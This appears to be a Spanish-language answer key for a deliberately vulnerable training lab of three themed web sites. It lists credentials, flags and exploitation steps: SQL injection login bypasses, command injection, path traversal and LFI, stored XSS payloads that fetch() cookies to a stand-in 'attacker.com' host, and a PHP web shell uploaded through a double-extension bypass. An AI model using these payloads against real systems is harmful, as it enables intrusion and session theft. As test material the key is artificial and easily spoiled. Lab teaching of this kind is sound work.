# Guía de Soluciones y Credenciales (Spoiler)

Este documento contiene la recopilación detallada de todas las credenciales, códigos de activación, vectores de explotación, bypasses y flags de los diferentes escenarios del laboratorio.

---

## Índice
- [Sitio 1: Estrella de la Muerte (Star Wars)](#sitio-1-estrella-de-la-muerte-star-wars---puerto-54340)
- [Sitio 2: Barad-dûr / Mordor (El Señor de los Anillos)](#sitio-2-barad-dûr--mordor-el-señor-de-los-anillos---puerto-54350)
- [Sitio 3: USS Enterprise (Star Trek)](#sitio-3-uss-enterprise-star-trek---puerto-54360)
- [Resumen Consolidado de Credenciales](#resumen-consolidado-de-credenciales)

---

## Sitio 1: Estrella de la Muerte (Star Wars - Puerto 54340)

### 1. Autenticación y SQL Injection
* **Ruta:** `/index.php` (Portal de Login)
* **Vulnerabilidad:** Inyección SQL clásica en los campos de usuario y contraseña por concatenación directa sin sentencias preparadas.
* **Bypass de Login:**
  * Usuario: `admin' -- ` o `' OR 1=1 -- `
  * Contraseña: *(cualquier valor)*
* **Credenciales reales en base de datos (`deathstar.users`):**
  * `admin` / `S1thL0rd!2024` *(Privilegios de Comandante Supremo, acceso a `/admin/`)*
  * `vader` / `DarkSide99`
  * `tarkin` / `DeathStar#1`
  * `TK-421` / `MIA_PostChange`

### 2. Inyección de Comandos (RCE)
* **Ruta:** `/admin/terminal.php` (Requiere sesión como usuario `admin`)
* **Vulnerabilidad:** Ejecución de comandos del sistema operativo (`shell_exec`/`exec`) a través del campo IP con una whitelist parcial de comandos permitidos (`id`, `whoami`, `ls`, `cat`, `pwd`, `uname`, etc.) y filtrado básico de la extensión `.php`.
* **Explotación:**
  * Concatenar comandos utilizando `;`, `|` o `&`:
    ```bash
    127.0.0.1; ls -la ..
    127.0.0.1; cat ../dev/flag.txt
    ```
* **Flag obtenida:** `FLAG{D34TH_ST4R_INJECTION_CMD_a7b3c9}`

### 3. Autodestrucción / Conducto de Ventilación Térmica
* **Ruta:** `/admin/destruct.php`
* **Archivo confidencial filtrado:** `sitio1/html/system/codigo_trampilla_reactor.txt`
* **Código de apertura:** `THX-1138-VENT`

---

## Sitio 2: Barad-dûr / Mordor (El Señor de los Anillos - Puerto 54350)

### 1. Autenticación Principal
* **Ruta:** `/login.php`
* **Credenciales de Sauron:**
  * Usuario: `sauron`
  * Contraseña: `oneringtorulethemall`
  *(Redirige al directorio privado `/private/`)*.

### 2. Path Traversal
* **Ruta:** `/library.php?file=...`
* **Vulnerabilidad:** Lectura de archivos locales mediante el parámetro `file`.
* **Archivos clave descubiertos:**
  * `secret/ring.txt`
  * `BlackGate-32/manual.txt` -> Revela la clave de apertura de la Puerta Negra.
  * `dev/notes.txt` -> Contiene la flag.
* **Flag obtenida:** `FLAG{M0RD0R_D3V_N0T3S_F0UND_t5v8k2}`

### 3. Cross-Site Scripting Persistente (Stored XSS) y Robo de Sesión
* **Ruta:** `/mordor/wall.php` (Tablón de mensajes)
* **Vulnerabilidad:** El campo de mensaje no sanea la entrada y aplica un filtro débil por expresión regular que solo comprueba `<script>`.
* **Bypass de XSS:**
  ```html
  <img src="x" onerror="alert(document.cookie)">
  <svg onload="fetch('http://attacker.com/?c=' + document.cookie)">
  ```
* **Robo de cookie:** La cookie de sesión `lotrCookie` fue configurada deliberadamente sin la bandera `HttpOnly` (`ini_set('session.cookie_httponly', 0)`), lo que permite exfiltrar la sesión del usuario mediante JavaScript.

### 4. Desbloqueo del Panel de Profesor en el Muro
* **Ruta:** `/mordor/wall.php`
* **Contraseña de Administrador:** `mmora`
* **Efecto:** Genera la cookie `admin_gate_pass` con el hash SHA-256 `b11a4369e06c7fdc024523773175727144e058428416ca327f27a6f296315264`, permitiendo borrar mensajes y limpiar el tablón.

### 5. Mecanismo de la Puerta Negra
* **Ruta:** `/private/black_gate.php`
* **Frase de activación:** `M3LL0N_ENTER_1954`

---

## Sitio 3: USS Enterprise (Star Trek - Puerto 54360)

### 1. Local File Inclusion (LFI) / Path Traversal
* **Ruta:** `/index.php?lang=...`
* **Vulnerabilidad:** Inclusión de ficheros mediante el parámetro `lang`.
* **Archivos clave a consultar:**
  * `internal_data/coordinates.txt` -> Coordenadas y código del Proyecto Génesis.
  * `dev/flag.txt` -> Flag clasificada.
* **Flag obtenida:** `FLAG{3NT3RPR1S3_LFI_SUCCESS_w7m3k9}`

### 2. Stored XSS en el Registro de Tripulación
* **Ruta:** `/index.php` (Formulario de mensaje de tripulación)
* **Vulnerabilidad:** Falta de sanitización en el mensaje guardado en la tabla `crew_messages`. Bloquea las palabras `alert` y `location`.
* **Bypass:**
  ```html
  <script>confirm(document.cookie)</script>
  <img src=x onerror="fetch('http://atacante/?k='+document.cookie)">
  ```

### 3. Autenticación de Oficial Superior
* **Ruta:** `/login.php`
* **Credenciales del Capitán:**
  * Usuario: `kirk`
  * Contraseña: `Starfl33t#1701`
* **Token persistente directo (Cookie):**
  * Nombre de cookie: `admin_session`
  * Valor: `c7d3f66713a27cdbb1faea28fc2f4026bd9cec4a8e395e8fd653e1311a270d1c`

### 4. Subida Arbitraria de Archivos (RCE)
* **Ruta:** `/management/index.php` (Requiere autenticación como admin)
* **Vulnerabilidad:** La validación comprueba únicamente si el nombre del archivo contiene la subcadena `.jpg` utilizando `strpos($filename, '.jpg') !== false`.
* **Explotación:**
  * Nombrar el archivo PHP con doble extensión: `shell.jpg.php` o `payload.php.jpg`.
  * Contenido del archivo:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
  * Ubicación resultante: `/management/uploads/shell.jpg.php`
  * Ejecución de comandos:
    ```
    http://localhost:54360/management/uploads/shell.jpg.php?cmd=id
    ```

### 5. Consola de Navegación Warp
* **Ruta:** `/admin/navigation.php`
* **Coordenadas Sector:** `MUTARA_NEBULA_GAMMA`
* **Código de Autorización:** `GENESIS_DEVICE_ARMED`
* **Flag obtenida:** `FLAG{WARP_SPEED_RESCUE_SUCCESS_GENESIS_7k2m9}`

---

## Resumen Consolidado de Credenciales

| Escenario | Servicio / Ruta | Usuario | Contraseña / Código | Función / Privilegio |
| :--- | :--- | :--- | :--- | :--- |
| **Sitio 1** | Web Login (`/index.php`) | `admin` | `S1thL0rd!2024` | Administrador supremo |
| **Sitio 1** | Web Login (`/index.php`) | `vader` | `DarkSide99` | Usuario oficial |
| **Sitio 1** | Web Login (`/index.php`) | `tarkin` | `DeathStar#1` | Usuario oficial |
| **Sitio 1** | Web Login (`/index.php`) | `TK-421` | `MIA_PostChange` | Usuario soldado |
| **Sitio 1** | MySQL CLI (`mysql_examen_1`) | `root` | `root_pass_examen1` | DBA base de datos `deathstar` |
| **Sitio 1** | Reactor (`/admin/destruct.php`) | — | `THX-1138-VENT` | Código de ventilación térmica |
| **Sitio 2** | Web Login (`/login.php`) | `sauron` | `oneringtorulethemall` | Administrador de Mordor |
| **Sitio 2** | Moderación (`/mordor/wall.php`)| — | `mmora` | Desbloqueo profesor / limpieza |
| **Sitio 2** | Puerta Negra (`/private/black_gate.php`) | — | `M3LL0N_ENTER_1954` | Frase élfica de apertura |
| **Sitio 2** | MySQL CLI (`mysql_examen_2`) | `root` | `root_pass_examen2` | DBA base de datos `mordor` |
| **Sitio 3** | Web Login (`/login.php`) | `kirk` | `Starfl33t#1701` | Capitán / Oficial superior |
| **Sitio 3** | Navegación (`/admin/navigation.php`) | — | Sector: `MUTARA_NEBULA_GAMMA`<br>Código: `GENESIS_DEVICE_ARMED` | Autorización Proyecto Génesis |
| **Sitio 3** | MySQL CLI (`mysql_examen_3`) | `root` | `root_pass_examen3` | DBA base de datos `enterprise` |
| **Sitio 4** | MySQL CLI (`mysql_examen_4`) | `root` | `root_pass_examen4` | DBA base de datos `db_sitio4` |
